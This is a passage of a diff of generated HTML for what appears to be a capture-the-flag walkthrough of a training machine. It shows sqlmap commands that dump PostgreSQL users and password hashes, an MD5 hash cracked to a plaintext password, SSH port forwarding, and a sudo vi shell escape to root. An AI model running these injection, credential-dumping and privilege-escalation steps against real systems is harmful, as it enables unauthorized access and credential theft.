+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>-D<span class="w"> </span>pg_catalog<span class="w"> </span>--tables
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25"></a>
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26"></a><span class="c1"># Response contains 62 tables. </span>
+</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27"></a>
+</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28"></a>
+</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29"></a><span class="c1"># Ask for users</span>
+</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--users<span class="w"> </span>
+</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31"></a>
+</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32"></a><span class="c1"># -----</span>
+</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33"></a><span class="c1"># [11:10:16] [INFO] resumed: &#39;postgres&#39;</span>
+</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34"></a><span class="c1"># database management system users [1]:</span>
+</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35"></a><span class="c1"># [*] postgres</span>
+</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36"></a>
+</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37"></a>
+</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>-D<span class="w"> </span>pg_catalog<span class="w"> </span>-T<span class="w"> </span>pg_user<span class="w"> </span>-C<span class="w"> </span>passwd,usebypassrls,useconfig,usecreatedb,usename,userepl,usesuper,usesysid,valuntil<span class="w"> </span>--dump
+</span><span id="__span-6-39"><a id="__codelineno-6-39" name="__codelineno-6-39"></a>
+</span><span id="__span-6-40"><a id="__codelineno-6-40" name="__codelineno-6-40"></a>
+</span><span id="__span-6-41"><a id="__codelineno-6-41" name="__codelineno-6-41"></a>
+</span><span id="__span-6-42"><a id="__codelineno-6-42" name="__codelineno-6-42"></a><span class="c1"># Ask for passwords</span>
+</span><span id="__span-6-43"><a id="__codelineno-6-43" name="__codelineno-6-43"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.129.95.174/dashboard.php<span class="w"> </span>--forms<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=kcr9helek579t5cjcldcbb5fc1&quot;</span><span class="w"> </span>--batch<span class="w"> </span>--passwords<span class="w"> </span>--dump
+</span><span id="__span-6-44"><a id="__codelineno-6-44" name="__codelineno-6-44"></a>
+</span><span id="__span-6-45"><a id="__codelineno-6-45" name="__codelineno-6-45"></a><span class="c1"># -----</span>
+</span><span id="__span-6-46"><a id="__codelineno-6-46" name="__codelineno-6-46"></a><span class="c1"># database management system users password hashes:</span>
+</span><span id="__span-6-47"><a id="__codelineno-6-47" name="__codelineno-6-47"></a><span class="c1"># [*] postgres [1]:</span>
+</span><span id="__span-6-48"><a id="__codelineno-6-48" name="__codelineno-6-48"></a><span class="c1">#    password hash: md52d58e0637ec1e94cdfba3d1c26b67d01</span>
+</span></code></pre></div></td></tr></table></div>
 <p>First 3 characters are a tip about the hash. Using https://md5.gromweb.com/?md5=2d58e0637ec1e94cdfba3d1c26b67d01 we obtain: The MD5 hash: 2d58e0637ec1e94cdfba3d1c26b67d01 was succesfully reversed into the string: P@s5w0rd!postgres</p>
 <p>Now, as we couldn't spot <a href="../5432-postgresql/">port 5432 (postgres)</a> open, we will use port-tunneling with ssh.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ssh<span class="w"> </span>UserNameInTheAttackedMachine@IPOfTheAttackedMachine<span class="w"> </span>-L<span class="w"> </span><span class="m">1234</span>:localhost:5432<span class="w"> </span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>ssh<span class="w"> </span>postgres@10.129.95.174<span class="w"> </span>-L<span class="w"> </span><span class="m">1234</span>:localhost:5432
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>ssh<span class="w"> </span>UserNameInTheAttackedMachine@IPOfTheAttackedMachine<span class="w"> </span>-L<span class="w"> </span><span class="m">1234</span>:localhost:5432<span class="w"> </span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="c1"># We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="c1"># We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>ssh<span class="w"> </span>postgres@10.129.95.174<span class="w"> </span>-L<span class="w"> </span><span class="m">1234</span>:localhost:5432
+</span></code></pre></div></td></tr></table></div>
 <p>After this, we can "cat" the user.txt file. </p>
 <p>To escalate provileges, first we can use some commands for basic reconnaissance:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>whoami
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>id
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>sudo<span class="w"> </span>-l
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>whoami
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>id
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div></td></tr></table></div>
 <p>Last one provides us with interesting output:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>User postgres may run the following commands on vaccine:
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>User postgres may run the following commands on vaccine:
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</span></code></pre></div></td></tr></table></div>
 <p>We can abuse <a href="../suid-binaries/">suid binaries technique</a> to gain access to root user:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="w"> </span>sudo<span class="w"> </span>/bin/vi<span class="w"> </span>/etc/postgresql/11/main/pg_hba.conf
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>:set<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>/bin/sh
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>:shell
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="w"> </span>sudo<span class="w"> </span>/bin/vi<span class="w"> </span>/etc/postgresql/11/main/pg_hba.conf
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>:set<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>/bin/sh
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>:shell
+</span></code></pre></div></td></tr></table></div>
 <p>Once there, print out root flag:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cat<span class="w"> </span>/root/root.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>cat<span class="w"> </span>/root/root.txt
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17132,7 +17235,7 @@ Two open ports: 21 and 80</p>
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
